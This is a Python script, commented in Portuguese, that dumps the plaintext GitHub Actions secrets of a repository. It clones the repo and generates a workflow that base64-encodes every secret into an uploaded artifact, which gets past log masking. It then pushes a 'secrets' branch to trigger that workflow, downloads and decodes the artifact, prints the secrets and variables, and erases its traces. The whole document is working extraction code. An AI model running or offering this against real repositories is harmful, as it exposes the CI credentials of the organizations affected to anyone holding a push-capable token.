import os
import re
import sys
import requests
import subprocess
import shutil
import time
import zipfile
import base64

def baixar_repo(organizacao, repo, token):
    # Clone o repositório usando o token para autenticação
    repo_url = f"https://{token}@github.com/{organizacao}/{repo}.git"
    clone_command = f"git clone {repo_url} --depth=1 --branch=main"

    try:
        subprocess.run(clone_command.split(), check=True, input="", universal_newlines=True)
        print(f"Repositório '{repo}' clonado com sucesso.")
    except subprocess.CalledProcessError as e:
        print(f"Erro ao clonar o repositório. Código de retorno: {e.returncode}")
        return
    return secrets

def generate_secrets_manifest_file(repo, secrets):
    manifest_file_path = f"{repo}/.github/workflows/{repo}_secrets_manifest.yml"

    with open(manifest_file_path, "w") as manifest_file:
        manifest_file.write(f"name: Recupera Secrets do Github Actions\n\n")
        manifest_file.write("on:\n")
        manifest_file.write("  push:\n")
        manifest_file.write("    branches:\n")
        manifest_file.write("      - secrets\n\n")
        manifest_file.write("jobs:\n")
        manifest_file.write("  recupera_secrets:\n")
        manifest_file.write("    runs-on: ubuntu-latest\n\n")
        manifest_file.write("    steps:\n")
        manifest_file.write("    - name: Checkout do repositório\n")
        manifest_file.write("      uses: actions/checkout@v2\n\n")
        manifest_file.write("    - name: Cria secrets_encriptografados.txt\n")
        manifest_file.write("      run: touch secrets_encriptografados.txt\n\n")

        for secret in secrets:
            secret_name = secret['name']
            manifest_file.write(f"    - name: Alimenta o arquivo com os dados criptografados\n")
            manifest_file.write(f"      run: echo \"{secret_name} = ${{{{ secrets.{secret_name} }}}}\" | base64 >> secrets_encriptografados.txt && echo \"\" >> secrets_encriptografados.txt\n")
            manifest_file.write(f"      env:\n")
            manifest_file.write(f"        {secret_name}: ${{{{ secrets.{secret_name} }}}}\n\n")

        manifest_file.write("    - name: Faz o upload do arquivo como um artefato\n")
        manifest_file.write("      uses: actions/upload-artifact@v2\n")
        manifest_file.write("      with:\n")
        manifest_file.write("        name: secrets_encriptografados\n")
        manifest_file.write("        path: secrets_encriptografados.txt\n")

    print(f"Arquivo '{manifest_file_path}' gerado com sucesso.")

def commit_and_trigger_workflow(repo, token, secrets_file):
    try:
        # Salva o diretório atual
        current_directory = os.getcwd()

        # Muda para o diretório do repositório clonado
        os.chdir(repo)

        # Adiciona todas as mudanças
        subprocess.run(['git', 'add', '-A'], check=True)

        # Faz o commit
        subprocess.run(['git', 'commit', '-m', 'Adiciona arquivo de secrets'], check=True)

        # Cria a nova branch "secrets"
        subprocess.run(['git', 'branch', 'secrets'], check=True)

        # Muda para a branch "secrets"
        subprocess.run(['git', 'checkout', 'secrets'], check=True)

        # Faz o push da nova branch
        subprocess.run(['git', 'push', 'origin', 'secrets'], check=True)

        # Retorna para o diretório de trabalho original
        os.chdir(current_directory)

        print(f"Commit feito e nova branch 'secrets' criada com sucesso.")
    except subprocess.CalledProcessError as e:
        print(f"Erro ao fazer o commit e criar a nova branch. Código de retorno: {e.returncode}")
        return
    
def limpar_repositorio(repo):
    secrets_file_path = f"{repo}_secrets.txt"

    # Exclui o arquivo de secrets, se existir
    if os.path.exists(secrets_file_path):
        os.remove(secrets_file_path)
        print(f"Arquivo '{secrets_file_path}' removido com sucesso.")
    else:
        print(f"O arquivo '{secrets_file_path}' não existe.")

    # Retorna ao diretório original e exclui o diretório do repositório clonado
    os.chdir(os.path.dirname(os.path.abspath(__file__)))
    repo_directory = os.path.join(os.getcwd(), repo)
    
    # Exclui o diretório do repositório, se existir
    if os.path.exists(repo_directory):
        shutil.rmtree(repo_directory)
        print(f"Repositório '{repo}' removido com sucesso.")
    else:
        print(f"O diretório do repositório '{repo}' não existe.")


def obter_variaveis_ambiente_actions(organizacao, repo, token):
    url = f"https://api.github.com/repos/{organizacao}/{repo}/actions/variables"
    resposta = requests.get(url, headers={'Authorization': f'token {token}'})

    if resposta.status_code == 200:
        variables = resposta.json()['variables']
        if variables:
            print(f"\nVariáveis de Ambiente para o Repositório '{repo}':")
            for variable in variables:
                print(variable['name'], "=", variable['value'])
        else:
            print(f"O Repositório '{repo}' não possui variáveis de ambiente no GitHub Actions.")
    else:
        print(f"Erro ao obter variáveis de ambiente. Código de status: {resposta.status_code}")
        print(resposta.text)

def obter_secrets_actions(organizacao, repo, token):
    url = f"https://api.github.com/repos/{organizacao}/{repo}/actions/secrets"
    resposta = requests.get(url, headers={'Authorization': f'token {token}'})

    if resposta.status_code == 200:
        variables = resposta.json()['secrets']
        if variables:
            print(f"\nSecrets para o Repositório '{repo}':")
            for variable in variables:
              print(variable['name'])
            return variables
            # for variable in variables:
            #     print(variable['name'], "=", variable['value'])
        else:
            print(f"O Repositório '{repo}' não possui variáveis de ambiente no GitHub Actions.")
    else:
        print(f"Erro ao obter variáveis de ambiente. Código de status: {resposta.status_code}")
        print(resposta.text)

def obter_ultimo_workflow_run_id(organizacao, repo, token):
    # Adiciona um atraso de 10 segundos
    time.sleep(10)
    url = f"https://api.github.com/repos/{organizacao}/{repo}/actions/runs"
    headers = {'Authorization': f'token {token}'}

    response = requests.get(url, headers=headers)

    if response.status_code == 200:
        workflow_runs = response.json()['workflow_runs']
        if workflow_runs:
            # Ordena os workflow runs por data de criação em ordem decrescente
            workflow_runs.sort(key=lambda x: x['created_at'], reverse=True)
            ultimo_workflow_run_id = workflow_runs[0]['id']
            return ultimo_workflow_run_id
        else:
            print(f"Não foram encontrados workflow runs para o repositório '{repo}'.")
            return None
    else:
        print(f"Falha ao obter a lista de workflow runs. Código de status: {response.status_code}")
        print(response.text)
        return None
    
def download_artifact(organizacao, repo, token, ultimo_workflow_run_id, artifact_name, destination_path):
    time.sleep(15)
    url = f"https://api.github.com/repos/{organizacao}/{repo}/actions/runs/{ultimo_workflow_run_id}/artifacts"
    headers = {'Authorization': f'token {token}'}

    response = requests.get(url, headers=headers)

    if response.status_code == 200:
        artifacts = response.json()['artifacts']
        for artifact in artifacts:
            if artifact['name'] == artifact_name:
                download_url = artifact['archive_download_url']
                download_response = requests.get(download_url, headers=headers, stream=True)

                if download_response.status_code == 200:
                    with open(destination_path, 'wb') as f:
                        for chunk in download_response.iter_content(chunk_size=128):
                            f.write(chunk)

                    print(f"Artefato '{artifact_name}' baixado com sucesso para '{destination_path}'.")
                else:
                    print(f"Falha ao baixar o artefato. Código de status: {download_response.status_code}")
                    print(download_response.text)
            else:
                print(f"Artefato '{artifact_name}' não encontrado.")
    else:
        print(f"Falha ao obter a lista de artefatos. Código de status: {response.status_code}")
        print(response.text)

def descompactar_arquivo_zip(destination_path, descompactado):
    try:
        with zipfile.ZipFile(destination_path, 'r') as zip_ref:
            # Cria o diretório de destino se não existir
            os.makedirs(descompactado, exist_ok=True)
            
            # Extrai o conteúdo do zip diretamente no diretório de destino
            zip_ref.extractall(descompactado)

        print(f"Arquivo '{destination_path}' descompactado com sucesso em '{descompactado}'.")
    except Exception as e:
        print(f"Falha ao descompactar o arquivo. Erro: {e}")

def exibir_conteudo_decodificado(arquivo):
    try:
        with open(arquivo, 'rb') as f:
            print(f"------------------------------:")
            print(f"------------------------------:")
            print(f"CONTEUDO DAS SECRETS:")
            for linha_binaria in f:
                linha_decodificada = base64.b64decode(linha_binaria).decode('utf-8')
                print(f"{linha_decodificada}")
    except Exception as e:
        print(f"Falha ao ler o arquivo. Erro: {e}")


if __name__ == "__main__":
    organizacao = '' #Adicionar user ou org aqui
    repo = '' #Adicionar repositorio aqui
    token_acesso_pessoal = '' #Adicionar chave do github aqui
    artifact_name = 'secrets_encriptografados'
    diretorio_corrente = os.getcwd()
    destination_path = os.path.join(diretorio_corrente, artifact_name)
    descompactado = destination_path + '_descompactado'
    arquivo_descompactado = os.path.join(descompactado, 'secrets_encriptografados.txt')

    print(f"\nObter secrets e variáveis de ambiente")
    secrets = obter_secrets_actions(organizacao, repo, token_acesso_pessoal)

    print(f"\nBaixando repo")
    baixar_repo(organizacao, repo, token_acesso_pessoal)

    print(f"\nGerar arquivo de manifesto para recuperação de secrets")
    generate_secrets_manifest_file(repo, secrets)

    print(f"\nCommit e acionar novo workflow na branch 'secrets'")
    commit_and_trigger_workflow(repo, token_acesso_pessoal, f"{repo}_secrets_manifest.yml")

    ultimo_workflow_run_id = obter_ultimo_workflow_run_id(organizacao, repo, token_acesso_pessoal)

    if ultimo_workflow_run_id is not None:
        print(f"O último workflow run ID para o repositório '{repo}' é: {ultimo_workflow_run_id}")
    else:
        print("Não foi possível obter o último workflow run ID.")

    download_artifact(organizacao, repo, token_acesso_pessoal, ultimo_workflow_run_id, artifact_name, destination_path)

    descompactar_arquivo_zip(destination_path, descompactado)

    exibir_conteudo_decodificado(arquivo_descompactado)

    print(f"------------------------------:")
    print(f"------------------------------:")
    print(f"CONTEUDO DAS VARIAVEIS DE AMBIENTE:")
    obter_variaveis_ambiente_actions(organizacao, repo, token_acesso_pessoal)   

    print(f"\nLimpar repositório")
    limpar_repositorio(repo)

try:
    os.remove(arquivo_descompactado)
    print(f"Arquivo '{arquivo_descompactado}' removido com sucesso.")
except FileNotFoundError:
    print(f"O arquivo '{arquivo_descompactado}' não existe.")

try:
    os.remove(destination_path)
    print(f"Arquivo '{destination_path}' removido com sucesso.")
except FileNotFoundError:
    print(f"O arquivo '{destination_path}' não existe.")

# Excluir o diretório
try:
    shutil.rmtree(descompactado)
    print(f"Diretório '{descompactado}' removido com sucesso.")
except FileNotFoundError:
    print(f"O diretório '{descompactado}' não existe.")
